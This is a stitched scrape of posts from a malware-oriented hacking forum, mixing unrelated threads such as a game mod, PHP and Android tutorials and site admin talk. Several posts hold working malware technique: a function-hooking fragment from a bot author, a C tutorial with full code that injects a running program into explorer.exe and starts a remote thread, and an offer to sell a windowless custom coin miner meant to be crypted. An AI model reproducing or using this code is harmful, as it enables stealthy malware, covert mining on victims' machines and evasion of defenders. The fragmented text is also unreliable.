1) = *(DWORD*)((LPBYTE)m_pvRedirectAddress + 1); // PUSH | RET *(BYTE*)((LPBYTE)m_pvTempStub + 5) = 0x68; *(DWORD*)((LPBYTE)m_pvTempStub + 6) = (DWORD)( (LPBYTE)m_pvTargetAddress + 5 ); *(BYTE*)((LPBYTE)m_pvTempStub + 10) = 0xC3; // Patch function // JMP *(BYTE*)(m_pvTargetAddress) = 0xE9; *(DWORD*)((LPBYTE)m_pvTargetAddress + 1) = ( (DWORD)m_pvRedirectAddress - ((DWORD)m_pvTargetAddress + 5) ); // Restore old rights, we don't care if this fails or not since it will be executable either way VirtualProtect(m_pvTargetAddress, 5, m_dwOldRights, &m_dwOldRights); // This is the what should be called once hook callback is done ( eg, return ( oldfunction(...) ) ) *m_pvOldStub = m_pvTempStub; return ERROR_SUCCESS; } int main() { NtHookInstall(GetProcAddress(GetModuleHandleW(L""ntdll""), ""ZwResumeThread""), ZwResumeThreadCallback, oldZwResumeThread); } I actually wrote the few lines of test code/some other stuff in the submit post box so forgive me if there are any minor syntax errors.

Uplink Hacker Elite Mobile Luxury Mod By Darktheatre - Gaming - HackHound,uplink-hacker-elite-mobile-luxury-mod-by-darktheatre,darktheatre,12/22/2013 0:00,"Uplink is a video game released in 2001 by the British software company Introversion Software. On 23 August 2006, it was made available for purchase on Valve's Steam service and on 24 March 2011 it was made available for purchase from the Ubuntu Software Center.[1] It is best described as a simulator of the cinematic depiction of computer hacking. Unlike other games that feature hacking as a mini-game, Uplink is a game solely about hacking. You are a hacker that takes jobs from various corporations to infiltrate the systems of other companies and accomplish specific goals. These goals can include finding/destroying specific data, editing financial data, forging transcripts, or destroying whole mainframe systems. This is not as easy as point and click however. The game tries to make itself seem as realistic as possible. One of the paramount concerns for the player is to eliminate any trace of their infiltration on a target server. This is accomplished by bouncing through a series of other servers in order to increase the amount of time it takes for a trace to be completed and then deleting access logs from selected machines. Players must gain administrative access to certain servers allowing them further time to accomplish their goals So they make a game in android platform NOW UPLINK MOBILE LUXURY MOD By darktheatre was here Features: - added 7 series of awesome darktheatre's gateways - Increase application performance up to 10-20% - Less application memory usage up to 5-10% - Remove unwanted sources - Enchanted graphic theme (more elegant) - Enchanted sound effects mod (more realism) - Equavalant music track between music and effects sound Screen Shot Description: =========================================================================================================== More than hundreds servers list =========================================================================================================== =========================================================================================================== Gateway Upgrading =========================================================================================================== =========================================================================================================== Hardware Upgrading =========================================================================================================== =========================================================================================================== Software Upgrading =========================================================================================================== =========================================================================================================== Software / Hacking Tools Operation =========================================================================================================== =========================================================================================================== Verity Lan Network Hacking gameplay =========================================================================================================== =========================================================================================================== Bank system =========================================================================================================== =========================================================================================================== Academy Database Hacking =========================================================================================================== =========================================================================================================== Social Database Hacking =========================================================================================================== =========================================================================================================== Criminal Database Hacking ===========================================================================================================v =========================================================================================================== =========================================================================================================== 7 Series Darktheatre's gateway sold =========================================================================================================== =========================================================================================================== =========================================================================================================== DOWNLOAD UPLINK LUXURY MOD by darktheatre + pdf complete guide http://www.4shared.com/zip/mqXL8MCW/UplinkMobileLuxury.html",Member

From this new system you can paste your code (16 languages to chose from and have code parsed) or simple text and get either direct links or even bbcode to get used through out the board. It can be found either on top navigation menu or simply visiting this link: http://hackhound.org/forums/pst/ As a quick example I've made a simple delphi pastebin and here are the results: Direct Link (that can be used on your browser and even guests can see it): http://hackhound.org...st/rw/1-ob12go/ Permanent Link (that can be used on your browser and even guests can see it): http://hackhound.org...pst/p/1-ob12go/ or as bb code that can be used straight on any post ( I am improving this feature atm):,Expert

Most of the stuff shared on malware research forums is the same and if not here it can be downloaded elsewhere. So I don't really see the point to make this stuff private. Yes, most of them just want to download tools and umm... ""hack"", but as you know Pong they will not get very far with just RAT and a public crypter. See there is a difference in beginners and skids, both have little or no understanding how the tools they use work under the hood. But beginners will try stuff out and come back with questions about things they don't understand, skids will fail and try something else. My point here is that people who genuinely want to learn will stay here, others come and go. It's just the way it is. Staff could make a private section in Malware Samples where we could put stuff that can't be found that easy or some HH custom things. Thing is I don't know how much people are willing to share...you know custom work. How can we decide who can have access and who don't? Associates and up? I hate how things are now in ""hacker"" community. A lot of people are in it just for money...no free sharing of knowledge, people acting ""uber"" and 1337 if you ask questions that are ""stupid"". What happened to ""There is no stupid questions, only stupid answers""? Real hacker community shares knowledge and are happy to show and learn someone who wants it. That's why we have 34567887 rats and crypters based on sources that were released by few people who wanted to show us how things work. I have a lot respect for that kind of people. Information should be free. Some ""dangerous techniques"" that can cause real damage can be shared among friends or individuals that deserve it, but public tools are public.",IntermediateMember

There is nothing that valuable on malware section that requires to be hidden or isn't shared anywhere else so I see no need for any of this. This is a forum. Forums have leechers and members that participate. You just have to live with it. If you want a private forum create your own with 10 of your buddies sharing stuff once a year. Regarding marketplace it was agreed between BullDog anf myself when we opened HH that there wouldn't be any limitations to items being sold besides obvious crime related topics. The HF discussion is something I do not take part of mainly it's not my business. What is an HF member? Are you a kind of HF member? I don't understand that kind of classification. Maybe I'm too stupid to understand it but I honestly don't. Also don't understand why is ppl so concerned about HF and their ""alledged"" kind of members. Crypters and RAT's make them ""low quality"" members? Where exactly did you start? Coding in C at 9am in the morning and by noon you had your own vulnerability scanner ready to use? I don't understand any of this attitude towards any member to be honest with you. Regarding forum administration penis sizes I have to tell you that the last time I logged in on any other malware related forum was more than 6 months ago when a TF admin decided to play games with us. Other then that I couldn't care less if other forums have 20000 or 200000 registrations a day. Same about members that come here to download a few apps. We all did it in the past and it won't be me judging them or their knowledge level or even block any content (besides the one that is already blocked) from their sight and all of them are welcome to HH. We try to reward members that participate a bit more with a distinct color and access to some blocked areas hoping to get 1 of the 50 that registered today to join us and have a good time with us. If it doesn't happen I will feel like job was done and we did our best. We can't win them all. It's hard to find the balance between good content and bad but we do our best to filter that same content and also to incentivate new members that we are worth their participation and time.

Main Feature Basic4android includes all features needed to develop great, real-world Android applications Compiled applications are native Android applications, there is no extra run-time or any dependencies Refer to http://www.basic4ppc...ndroid/why.html for the complete features. Change Log This version includes many important improvements: Visual designer Anchors feature - makes it easier to target multiple screen sizes. See this short video. Copy & paste - work both inside the layout or between different layouts. Undo / redo feature. The views are organized in a tree for easier navigation. AutoScaleAll keyword now works with all variants, not just the ""standard"" variant. Colors fields can be copied and the colors values can be pasted or directly typed. Designer script find / replace dialog. The grid is saved in the layout file. Landscape / Portrait designer keywords to test the current orientation. UI Cloud threshold reduced to 10 seconds. #AdditionalRes attribute - Makes it possible to wrap Android library projects (projects with resources). See this example: jfeinstein10 SlidingMenu library Sync button in the Files tab - Syncs the project files with the Files folder. Modules added to the Find Sub / Module tool (Ctrl + E).

This cpu miner is based on the source code of http://sourceforge.n...jects/cpuminer/, also known as ""minerd.exe"", hence it is fully compatible with it, but it is standalone, no drops and no dependencies. It handles stratum (honestly I am not sure what this is for, but thought to mention it). It is not FUD, no startup or injection or whatsoever. (Anyway if you going to crypt it you can add injection and/or startup) so I did not bother with it. You would have to pass me your command line parameters, for example: minerd -a scrypt -o stratum+tcp://stratum3.dogehouse.org:8080 -u youruser.yourworker -p workerpass Based on this, I build you your miner, so these arguments will be built in into the exe, no way for you to change them, unless if you are a cracker and if you want to ruin my business. Price is 20$ as I mentioned in the subject, and I will give you two executables, both the same but one is without a window, the other one has a console window (for test purposes). I attached a pre-built miner with console window for test purposes/verification, etc.. No need to specify any command line arguments (they are built into the executable), just run it.

PHP:OOP - Serialization of Objects and Variable Variables - Resources - HackHound,phpoop-serialization-of-objects-and-variable-variables,Keeper,2/18/2014 0:00,"Introduction: First off - serialization. Serialization is the conversion of objects or pieces of data into a format that is handling their type and structure and is being stored temporarily so as to called later on in the php code. Whenever the execution of the php code ends, every object is being destroyed (in some cases they are being destroyed even before that). Which actually means that every information is being erased. So in order to get the object in the state that it was at a particular time, we'd need to either, write the whole code again or just serialize the object. Some of the benefits you could have using serialization is: A method of persisting objects - The property for storing objects and maintaining their type A method for distributing objects - This is basically a module that works simultaneously with another one but they are both on located on different computers that share the same network. Usage in remote procedure calls - The ability to execute a code in a range of virtual addresses sharing the same network How it works? Let's say we have a simple class named User.php that has two properties Name and Age & setName and setAge. name; } public function setName($name) { $this-name = $name; } public function getAge() { return $this-age; } public function setAge($age) { $this-age = $age; } } ? A pretty basic class that we can append something to and call it afterwards - nothing complicated. Now let's get an idea of a script that would append certain values to it: setAge(20); $a-setName('Keeper'); echo $a-getName(); ? We make a new instance for the class with the first variable $a and define the age and name for the class we've included. Now let's set some default values to the variables for name and age in our class User(). name; } public function setName($name) { $this-name = $name; } public function getAge() { return $this-age; } public function setAge($age) { $this-age = $age; } } ? Upon executing index.php which has User.php included, we get the result 'Keeper'. So there is nothing new or awkward. The thing is that the objects are being destroyed and we get returned the last getName(); value which is the string 'Keeper'. So let's actually see actually see how this goes. When we serialize an object we convert it to a string that we can manipulate in numerous ways. Afterwards, we just unserialize the string and we have returned the value of the object as it was till the time we serialized it. setAge(20); $a-setName('Keeper'); echo serialize($a); ? Echoing out the variable that hold the function, outputs this: O:4:""User"":2:{s:10:""Username"";s:6:""Keeper"";s:9:""Userage"";i:20;} That is the string value of the object. Every symbol within it has a huge importance to PHP as a whole. Let's say we serialize it like so and append the output to a variable called $b. Now we can take that object after 5 minutes, 1 year or a decade and we will still unserialize it successfully. setAge(20); $a-setName('Keeper'); $b = serialize($a); $c = unserialize($b); echo $c-getName(); ? We get 'Keeper' as the output. That indicates that the object has successfully been converted to a string and then again, reconverted to an object. If we get to define the value of the object like that: .. $c = unserialize($b); $c-setName('Infamous'); echo $c-getName(); ? Logically, we get outputted the string 'Infamous'. Also another important thing to know is that the serialization doesn't work with source code, it uses its data - not itself. As confusing as it may it seem, there is such thing. That's the property of PHP to append the value of a variable to another variable. I'll write the classes again and start from scratch, meanwhile I'll be explaining everything there is to know. Subsequently, we'll get to the variable variables, but I first wanna make sure you know what we are talking about, the concept of variable variables and how it could come in handy for a project development or whatever. We'll write a class for a validator of a non-existent form and output default results just as a proof of concept. Let's give it some data and define a couple of rules based on which it will validate the input. First making a method for the data that should be validated. And because we gonna use it inside of the object, let's make a property which would be an array and the place where we'll store the data. Also a method which will set the rules. data=$params; } public function setRules($field,$type,$param){ $this-rules[$field][]=array('type'=$type,'param'=$param); return $this; } public function validate(){ } } ? Now to the index.php file. In it we'll include the Validator.php, make an instance for it and set the rules for the validation. Also notice this method and the returning of itself from the upper code: public function setRules($field,$type,$param){ $this-rules[$field][]=array('type'=$type,'param'=$param); return $this; } It's a method called chaining and it happens when we call a method from the same method from the same object. Okay let's put an example to make it more clear. Now, the idea is not to call the variable that holds the reference to the object every time. Instead of this, we call the method which calls an instance for it and so on. So the below example is that of a multiple variable defining and not the chain method. setData(array('username'='Keeper','pass'='Antagonism')); $v-setRules('username', 'min_length', 4); $v-setRules('username', 'max_length', 8); $v-setRules('pass', 'min_length', 4); $v-validate(); ? This is an example of the chain method where we call an object and afterwards the instance for it. setData(array('username'='Keeper','pass'='Antagonism')); $v-setRules('username', 'min_length', 4)- setRules('username', 'max_length', 8)- setRules('pass', 'min_length', 4); $v-validate(); ? Technically, there is no difference whether you write your code like so or use multiple variable defining. I personally prefer the chain method cuz it's tidier and the code is better structured. Now let's see what we have as the current rules we've applied. I'm gonna simply dump the array like so: data=$params; } public function setRules($field,$type,$param){ $this-rules[$field][]=array('type'=$type,'param'=$param); return $this; } public function validate(){ echo ' '.print_r($this-rules, true).' '; } } ? We get this: Array ( [username] = Array ( [0] = Array ( [type] = min_length [param] = 4 ) [1] = Array ( [type] = min_length [param] = 8 ) ) [pass] = Array ( [0] = Array ( [type] = min_length [param] = 4 ) ) ) In the field of username, it has to check for a minimum length of 4 symbols and a maximum length of 8 symbols and the field for password should be just checked for the minimum length of 4. Outputting the array value gets you more aware of what we currently have as a code and the result. data=$params; } public function setRules($field,$type,$param){ $this-rules[$field][]=array('type'=$type,'param'=$param); return $this; } public function validate(){ foreach ($this-rules as $k = $v) { foreach ($v as $vv) { if($vv['type']=='min_length'){ $this-min_length($k, $vv['param']); } else if($vv['type']=='max_length'){ $this-max_length($k, $vv['param']); } } } } private function min_length($field,$param){ if(mb_strlen($this-data[$field])$param){ echo $field.' min_length is OK '; } else{ echo $field.' min_length is NOT OK '; } } private function max_length($field,$param){ if(mb_strlen($this-data[$field])'; } else{ echo $field.' max_length is NOT OK '; } } } ? The first foreach() cycle holds the rules and the $k variable is the field we want to call. Now let's make a checks for all fields. We need to create a method for each and every one of them and loop them in an if() cycle so as to perform the validation. With the first if() we check if the type of the check is minimum length, then we call the method min_length and make it accept the name of the field and what parameters it should accept. Meanwhile, with the second if() cycle we check if the length is larger than the parameter's value and if so we return true, if not - false. We do the same for the maximum length as well. So to check whether this code is in fact functional, let's echo an example for every check. Upon execution of this code, we get the following: username min_length is OK username max_length is NOT OK pass min_length is OK Now going through our index.php where we've defined our rules for the validation, we have: 'Keeper' as username and 'Antagonism' as password. Since the string is over 4 characters, the first check returns true. It is also true that the maximum length of the string is not exceeding 8 characters and the same goes for the password value. Let's go about modifying the function validate() so as to be using a variable variable and to explain you how it goes. rules as $k = $v) { foreach ($v as $vv) { $this-max_length($k, $vv['param']); } } } } ? Which is the same if we make it look like so: rules as $k = $v) { foreach ($v as $vv) { $this-$vv['type']($k, $vv['param']); } } } ? In the first iteration, the line: $this-$vv['type'] hold the string min_length. When appending a dollar sign to it, PHP will execute the object or property with that name. Actually, we don't even know what the variable variable is. Whenever we add a $, the variable that hold the value, that very value becomes the name of the field. So in every iteration of the script, this will go through min_length, max_length and so on. The idea behind variable variables is that we can take the name of an object or property from a variable's value and call it the same way. Conclusion: This was the second tutorial from my series on object-oriented programming in PHP. It happened to be larger than I expected. Got way deeper than I should but, the more - the better. I hope at least one person reads it and gets something out of it. If anyone has any questions or issues with the class and methods, leave a reply here or PM me. Thanks for reading!",Beginner

We really don't need this since our keywords are mainly malware names(Zeus, Rat, free rat) and many search hits on 'Hackhound'. And no search queries towards programming related things. And it's also quite obviously that .NET programming can be C#, VB.NET and such. That's why the description says ""The .NET library supported programming languages section."" The older basic version are can be compiled as native executable's and don't depend on any .NET library. ""Programming (Un)Detection"" would better be classified as ""Cryptography and Obfuscation"" when you look at the threads.

Furthermore it includes support for restoring original code and creating function copies that work well within my bot. Hook callbacks (betabot has over 30 active hooks), it goes on. And then of course my style of coding usually results in more code anyway, as I like to do a lot of checking. Of course the actual code to hook a function isn't that big.

Basic4Android Book - Resources Sources - HackHound,basic4android-book,delphifocus,3/22/2014 0:00,"Homepage : http://www.basic4android.info/ Basic4Android is widely recognised as the best RAD tool available for Android. “Basic4Android” by Wyken Seagrave is the first book describing this exceptionally easy system. It covers version 3.00 of the IDE (Integrated Development Environment). Basic4Android knocks spots off every other IDE for Android. Most of them require developers to learn Java with all its complexities as well as wrestling with the use of an unfamiliar hardware platform. Basic4Android makes everything easy. Only B4A allows developers to easily create native and market-compatible applications without having to write any XML, achieving a performance that is similar to Java written applications. Using it, those developers who know Visual Basic better than Java can go from downloading Basic4Android to creating their first native app on their device within seven minutes. The following remarks are typical of what professional developers say: Spoiler “I’ve [made] more progress with B4A in 3 hours than I have in 3 months with other Android IDEs.” Morgan Matthews. “I must say as a Visual Basic expert Basic4android is the best software purchase I’ve made in a long time. Within an hour of installing I had a fully functional application running on both my phone and tablet.” Dylan Palmer. “This is the greatest product ever! After spending two months trying to learn Java, I stumbled upon you. I have been a VB programmer for 25 years, and I am in heaven now! Thank you!” Marc Mieher. This delightful system has produced a dedicated band of over 25 thousand developers who have expanded the system by contributing their own libraries to the community as well as helping each other solve problems. However it’s not always easy to find the information you want from the on-line help provided. Amazingly there are no books on the subject. “I have wanted to see a book about Basic4android for a long time now,” says Erel Uziel, CEO of Anywhere Software, creator of Basic4Android. And so UK publisher Penny Press has asked resident author Wyken Seagrave to write the first ever book on the subject: “Basic4Android: Rapid App Development for Android” His complete guide will be suitable for intermediate and expert developers but will also be useful for beginners. It will cover every aspect of B4A from installation and using the WYSIWYG visual editor through a comprehensive reference section to using Additional Libraries supplied by other users. It will quickly repay its cost by the time saved in finding the information developers need when they need it.

Raid Drivers - Firmware / Drivers - HackHound,raid-drivers,x58,3/27/2014 0:00,"So what i got from that , SSD's are way better .. And Hardware Raid is shit because it breaks ..... Does software raid break like the hardware raid ?? I think once i get the money im going to upgrade to SSD's I have been talking about this subject with an professional, and he told me that hardware raid is likely going to be better. As software can corrupt the drive in most cases and it will be a lot slower, however if you have a hardware raid and it breaks you need to replace it with the same raid controller. Also servers or enterprise hardware have raid backup batteries. So when power drops or server will get powered suddenly it will not fuck the raid configuration and data etc. It depends on what is the most important for you. Speed or reliability. If you are going to raid a HDD or SSD in raid0 and one breaks all your data will only be 50% of it, if you use 2 drives for a zero setup. Thus makes it all data unusable. You have not much choices but to make backups daily or to buy more hard-drives so you can run them in raid10 (redundant, more reliable and fast) all you actually need. Im not sure but i believe that you need at least 4 drives to do a r10 (same drives in capacity).",Advanced

The reason for why it's creative is the games core mechanics of the flash light and the use of stealth when playing as a thief. These concepts alone allow a player to psychologically play with their opponents or if your good enough to be able to predict where thieves are located at what time during play. As the game is still effectively a beta, the developers are incrementally adding new features, but I feel that as they are doing this, they are deviating from what made the game fun in the first place. But in it's current form, these are till largely intact and it's still fun to play. If you haven't played before, it is definitely worth checking out.",Newbie

To make things effective, we will make a Trials of thread views.. So, when the visitor reaches a specific number of views, the content is locked and he needs to register in order to continue reading. This will bring a lot of active members and also increase the SEO of the community. 2- Create a money making section; since their are a lot of money generating Viruses and Adwares as well. we can make a dedicated section in which all the methods of making money online will be disscussed.. Starting from Viruses, Adwares, and ending with affiliates marketing and CPA. These Changes.. will reborn the community in another Style. So, what you think?",Banned

PortEx - Java-Library for Static Analysis of PE Files - Team Projects - HackHound,portex-java-library-for-static-analysis-of-pe-files,Deque,4/28/2014 0:00,"The Alpha of PortEx is out. What is PortEx? PortEx is a library aimed at Java developers and reverse engineers. It enables you analyse Portable Executable files (e.g. EXE, DLL files) and has a special focus on malware analysis. In addition to just viewing a lot of file format information it provides tools that help you with reverse engineering or malware analysis. PortEx is written in Scala and Java. PortEx is free, open source and still in heavy development. Although I made Unit Tests for the most parts of the code there might still be bugs. Features Reading Header information from: MSDOS Header, COFF File Header, Optional Header, Section Table Dumping of: MSDOS Load Module, Sections, Overlay, embedded ZIP, JAR or .class files Mapping of Data Directory Entries to the corresponding Section Reading Standard Section Formats: Import Section, Resource Section, Export Section, Debug Section Scan for PEiD userdb signatures Scan for jar2exe or class2exe wrappers Scan for Unicode and ASCII strings contained in the file Get a Virustotal report Usage If you want to use the current build, download portex.jar from: https://github.com/katjahahn/PortEx Then include portex.jar to your project build path like you would do with any other library. Some usage examples: Printing header information of a PE file: File file = new File(""filepath""); PEData data = PELoader.loadPE(file); System.out.println(data); Printing imports of a PE: PEData data = PELoader.loadPE(file); SectionLoader loader = new SectionLoader(data); ImportSection idata = loader.loadImportSection(); System.out.println(idata.getInfo()); Scanning for peidt signatures: SignatureScanner scanner = SignatureScanner.getInstance(); boolean epOnly = true; File file = new File(""peid.exe""); List results = scanner.scanAll(file, epOnly); for(String signature : results) { System.out.println(signature); } For more examples visit the PortEx-Wiki: https://github.com/k...ahn/PortEx/wiki And look into the documentation: https://katjahahn.gi...ortEx/javadocs/ License Apache License, Version 2.0 Project Page Visit the project page to stay up-to-date about changes in PortEx and to get the current build. https://katjahahn.github.io/PortEx/ Contact Write an E-Mail to: portx@gmx.de Special Thanks Special thanks to @chmod for the PortEx banner.",IntermediateMember

We now have solved the issue so far, Ravage has migrated us to Cloudflare so we stay online for a full day and don't get flooded again by bots that may connect later on. At this moment we are not sure if we will continue to use Cloudflare or not. But most likely we won't use it any longer than a week, as Cloudflare causes a lot of other small issues. And it's not comfortable to type those captchas each time when you post a reply/topic. Sorry for the inconvenience.",Advanced

[Request] Please teach me how to Inject my server into a process&#33;&#33; - General Discussion - HackHound,request-please-teach-me-how-to-inject-my-server-into-a-process,Tigerass,5/13/2014 0:00,"Ok. but only because i am rather writing something for you than looking at my math stuff OS like linux mac and windows have some executable file formats. They are all pretty similar. Here are some file formats (exe, elf, zip, pdf, ...) as posters: Please Login or Register to see this Hidden Content You don't know what to do with them I guess. You need to know basics: When an portable executable (PE) is launched by Windows, it gets loaded into memory. This job is done by the OS, triggered by functions like ShellExecute, CreateProcess, ... The process memory space is managed by the OS, you don't see memory of other processes in there. (virtual process space) Since there is ASLR, your programm has no fixed base address if not explicitly defined. (This means more work, compile with fixed base. So there will be no .reloc section) If your programm has imports, additional dependencies (often used code, stored mostly in .dlls, like the winapi) it needs to get mapped into you process space, too. So your process has access to it. Every exe has some process entry point (void main() or whatever it is called into your language). If the exe is finally loaded into memory, the os will create an new thread, starting execution at this position. You need to know about the PE loading process: an exe consists out of several parts, you can also explore them with tools like CF explorer or even 7zip. These parts are called sections. For e.g. there is an .code section and an .data section. In the .code section is stored the assembler code of your executable, in the .data section for e.g. strings you use inside your code. How to get this data? look at the picture, READ CAREFULLY AND BETTER THINK TWICE, AT THE BOTTOM RIGHT ARE NOTES. Every section has attributes saved inside the section header (see picture) like the characteristics (executable, readable, writable), virtual size, pointertorawdata. THIS IT IMPORTANT! virtualaddress tells the pe loader where to write the section inside the address space of your process. pointertorawdata is the position inside the exe where the section data is read from. Other values are selfexplanatory. base of .code section is most times asdf.exe + 0x1000. The example in the picture has it's base of code there, too. Ok stoppoing here I see it's explained at the bottom of the picture. If you don't have import you don't even need this part. If you don't get it grab cheatengine and take a look at some example process memory space. If you can loop through the sections table in VB6 and print the section names you understood this part so far. You must be known to pointers and how the process looks mapped inside memory! (cheatengine, examine some running process) If you can do this, the following will be easy: Windows gives you funcitons Like VirtualAllocEx, VirtualProtect (section characteristics) and Write/ReadProcessMemory. You have to rebuild the loading process mentioned above, but in the context of for e.g. explorer.exe If you compiled with an fixed base, you don't have to care for base relocation. But there could be some problems if the base address matches with the one of some previously loaded dll. If you use relocation see the image how to handle them. After this complicated part the simple one follows. call CreateRemoteThread with the handle of the victim process and the entrypoint. Everything should work. if not, cheatengine or some other debugger! Congratulations, you've build some runpe reading a file, injecting it into an running process and execute it. It's much easier if you let the OS do the loading job and just copy your whole process memory inside the target process at the same position! (see malwaretech blog) It is highly recomned to be known at least a little to C / ASM. Learn the basics by creating some process with cheatengine and go through it step by step.

[C] Process injection with relocations - Resources - HackHound,c-process-injection-with-relocations,Tigerass,5/19/2014 0:00,"So i found the time to quickly implement relocations inside the first process injection example (http://hackhound.org...no-relocations/) Also did some minor bugfixes. (For e.g. an upper/lowercase bug. GetModuleFileName string on explorer differs from which parent it was started. ""explorer.exe"", ""explorer.EXE"") So what's new? Only some minor changes in the logic and this piece of code doing the relocations. /* Perform relocations. Sorry for that many typecasts. This could have been solved way better...*/ { PIMAGE_BASE_RELOCATION reloc; /* getan pointer to the relocation data */ reloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)nth-OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (DWORD_PTR)dosh); /* while in range loop through the blocks of relocation data */ while ((DWORD_PTR)reloc - (DWORD_PTR)dosh OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (DWORD_PTR)nth-OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) { LPWORD w; /* go through all WORDS of relocation data inside one block */ for (w = (LPWORD)((DWORD_PTR)reloc + sizeof(IMAGE_BASE_RELOCATION)); (DWORD_PTR)w SizeOfBlock; w++) { /* which relocation type is it? because we are injecting ourselve we don't have to differ between x64 and x32. DWORD_PTR is DWORD in x32 and QWORD in x64 mode */ switch (*w 12) { case IMAGE_REL_BASED_ABSOLUTE: continue; case IMAGE_REL_BASED_HIGHLOW: case IMAGE_REL_BASED_DIR64: *(DWORD_PTR*)((DWORD_PTR)imagesrc + reloc-VirtualAddress + (*w & 0x0fff)) += ((DWORD_PTR)imagedst - (DWORD_PTR)dosh); break; default: MessageBox(0, ""relocation not supported error"", ""relocation error"", MB_OK); goto cleanup; } } reloc = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)reloc + reloc-SizeOfBlock); /* goto next relocation block */ } } Because this code isn't good reading I decided instead of fixing it making an tutorial in this time. Let's start at this point: At the end of the optional header is placed an so called ""image data directory"". It holds pointers and size for some tables like the import/export tables and most important for us, an pointer to the relative virtual address (= address when finally loaded in memory minus the process image base). In our case this is the RVA of 0x3000. The complete size of the table is 0x58. Most times compilers make an extra section for the relocation information called "".reloc"". So what's inside this relocation section? The first 8 byte belong to an structure called IMAGE_BASE_RELOCATION. There are most times multiple IMAGE_BASE_RELOCATION structures in an row. We are lucky, in our case there is only one. After those few bytes follows the actual relocation data, each has the size of an WORD. /* Based relocation format. */ typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; //(red) This is the offset for all relocations in this block. (we'll come to this later) DWORD SizeOfBlock; //(blue) This is the size of the current relocation block. Address of the current block + this value == next block } IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; As you can see, our VirtualAddress is 0x1000 and the SizeOfBlock is 0x58. First real relocation information would be 0x3069, next one is 0x306E. 0x58 is 88d in decimal, the size of an relocation information is sizeof(WORD) == 2 Bytes. We have 40d relocation informations (green), so we get an total of 80d Bytes. Adding the sizeof(IMAGE_BASE_RELOCATION) we get the value of SizeOfBlock. This is what it looks like if there are more than one IMAGE_BASE_RELOCATION blocks. You know that you haven't reached the end of blocks if you are between the DataDirectory.VirtualAddress and the VirtualAddress plus it's size. The two bytes of relocation data consists out of two informations. The last 4 bits represent an number between 0 and 15d. The type of relocation is stored in there. For e.g. IMAGE_REL_BASED_DIR64 and IMAGE_REL_BASED_HIGHLOW. (Standart relocation for x64 and x32) The remaining 12 bits represent the address where the relocation should be performed. You have to add the VirtualAddress offset of the current block to this value, otherwise it would be some quite small addressing range How to seperate the data inside this WORD? Getting the last 4 bits is easy. you simply perform an shift right operation (a n). This moves every bit inside a n-times to the right. The values on the right drop off, the left side is filled up with zeros. Getting the other bits requires an logical and operation. If you take a look at the table below you can see the definition of the logical and (&) with an example. Now that we can extract all the data we need, it's time to relocate! Our RVA of code is placed at 0x1000, (0x450 fixed offset in our compiled .exe) the entrypoint is at RVA 0x1050, I'll set this as the Base Address. If you take a look at the values going to be relocated, you will determine that those values have all the same base, 0x400000. This is the preferred imagebase. If the OS can load the process image at this position, it don't have to perform relocations. In the previous version we had a fixed base, so if we couldn't load the process at this position in memory we would have failed. For an exe this is no problem, but for dlls this is some serious problem. (imagine two different dll's without relocation information but the same fixed base needed.) Now that we can loop through the relocation information, and hopefully understood how it works, we simply have to add the offset of our process base and the destination base to the values pointed at. Why our base and not the preferred imagebase? Because our process is already loaded inside memory, so the relocations where already performed by the OS. We are just updating an reflection of our process and moving it into the target process. Finally here is the full code, VS2010 project inside the attachment as usual. int main() { char filename[MAX_PATH]; GetModuleFileName(0, filename, MAX_PATH); /*Get the full executable path of the current process*/ /*Are we executing in explorer.exe? +GetWindowsDirectory to cut off the windir path. lstrcmpi - no case-sensitivity*/ if(!lstrcmpi(filename + GetWindowsDirectory(0, 0), ""explorer.exe"")) /*Yes? then here we go...*/ { MessageBox(0, ""hello from explorer process"", ""hi"", MB_OK); return 0; } Inject(); /*If not, try to inject.*/ return 0; } /* * Injects the current process into explorer.exe and creates an remote thread. * You have to call loadlibrary if you need some lib not loaded by explorer already! */ void Inject() { HANDLE hProcess; HANDLE hHeap; DWORD imagesize; LPVOID imagesrc; LPVOID imagedst; SIZE_T written; PIMAGE_DOS_HEADER dosh; PIMAGE_NT_HEADERS nth; dosh = (PIMAGE_DOS_HEADER)GetModuleHandle(0); /*Get our modules base address in memory, this is where our MZ header starts*/ nth = (PIMAGE_NT_HEADERS)((DWORD_PTR)dosh + dosh-e_lfanew); /*Get the PE headers offset*/ imagesize = GetRealImageSize(nth); /*Real imagesize in memory*/ hProcess = OpenProcess(MAXIMUM_ALLOWED, 0, GetExplorerPid()); /*Open explorer.exe process with maximum allowed privileges*/ hHeap = GetProcessHeap(); if(!hProcess) { MessageBox(0, ""opening explorer.exe process failed"", ""open process fail"", MB_OK); return; } /* Allocate memory as an workingspace to modify our process. */ imagesrc = HeapAlloc(hHeap, 0, imagesize); if (!imagesrc) { MessageBox(0, ""local memory allocation failed."", ""alloc fail"", MB_OK); CloseHandle(hProcess); return; } /* Copy our whole process into allocated memory.

Well i already can tell you that we won't change back to Cloudflare if it's up to me to decide. As Cloudflare, 1. Sucks and causes problems with he board software (strange issue on some nodes e.g content not properly loading like style files, png's etc) 2. Cloudflare supports and helps bad people(carders ddosers, skiddies and so on), i personally won't pay them a penny 3. We have other better alternatives for this At this moment HackHound runs on a overkill server.. In the future we will probably downgrade to safe a lot of money. And might upgrade again when the activity rises again. You won't notice anything as the current activity isn't putting any big load on the server at all. Only when gay bots start to flood, but for this we also have a new solutions.",Advanced

The storm is over - DashBoard - HackHound,the-storm-is-over,x58,5/20/2014 0:00,"Where did he wrote he will only support if we use CF? This would seem VERY strange to me... Not really, unless he's willing to donate 100+ US each month (nobody in the entire world will do this).. And i don't think so. Donations aren't good enough to pay the bills with. DDoS protection on the scale we need costs us 200+ US at least. So not many companies will stay left to make choice of but only the mainstream crap like Cloudflare, Incapsula etc. At least Incapsula doesn't seem too bad at all. Better than CF if you ask me but for this you pay a lot more. Andy why should chamelephon be interested in the stability of HH? Surprises me too! He only has two posts, and yet already cares about the community.

